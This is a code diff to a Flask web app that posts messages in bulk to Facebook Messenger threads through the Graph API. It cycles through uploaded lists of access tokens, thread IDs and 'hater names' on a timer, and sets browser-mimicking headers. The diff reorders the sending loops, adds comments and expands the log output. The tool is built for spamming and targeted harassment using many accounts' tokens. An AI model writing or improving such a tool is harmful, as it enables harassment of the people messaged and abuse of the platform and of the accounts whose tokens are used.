@@ -8,6 +8,7 @@ import string
 app = Flask(__name__)
 app.debug = True
 
+# Using headers to simulate a real browser request to the Facebook Graph API
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -26,19 +27,19 @@ def send_messages(access_tokens, thread_ids, hater_names, time_interval, message
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
         for thread_id in thread_ids:
-            for hater_name in hater_names:
-                for message in messages:
-                    if stop_event.is_set():
-                        break
-                    for access_token in access_tokens:
+            for access_token in access_tokens:
+                for hater_name in hater_names:
+                    for message in messages:
+                        if stop_event.is_set():
+                            break
                         api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        msg = f"{hater_name} {message}"
+                        msg = f"{hater_name}: {message}"
                         parameters = {'access_token': access_token, 'message': msg}
                         response = requests.post(api_url, data=parameters, headers=headers)
                         if response.status_code == 200:
-                            print(f"Message Sent Successfully From token {access_token}: {msg}")
+                            print(f"Message Sent Successfully From token {access_token} to {thread_id}: {msg}")
                         else:
-                            print(f"Message Sent Failed From token {access_token}: {msg}")
+                            print(f"Message Sent Failed From token {access_token} to {thread_id}: {msg}")
                         time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
@@ -46,22 +47,25 @@ def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
         
+        # Depending on user choice, read either a single token or multiple tokens from a file.
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
-        
+
         # Read multiple thread IDs and hater names from inputs
         thread_ids = request.form.get('threadId').strip().splitlines()
         hater_names = request.form.get('kidx').strip().splitlines()
         time_interval = int(request.form.get('time'))
 
+        # Read messages from file
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().strip().splitlines()
 
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-        
+
+        # Setup for stopping threads
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_ids, hater_names, time_interval, messages, task_id))
         threads[task_id] = thread
@@ -125,7 +129,7 @@ def send_message():
         <input type="file" class="form-control" id="tokenFile" name="tokenFile">
       </div>
       <div class="mb-3">
-        <label for="threadId" class="form-label">Enter Inbox/convo uids (one per line)</label>
+        <label for="threadId" class="form-label">Enter Inbox/convo UIDs (one per line)</label>
         <textarea class="form-control" id="threadId" name="threadId" required></textarea>
       </div>
       <div class="mb-3">
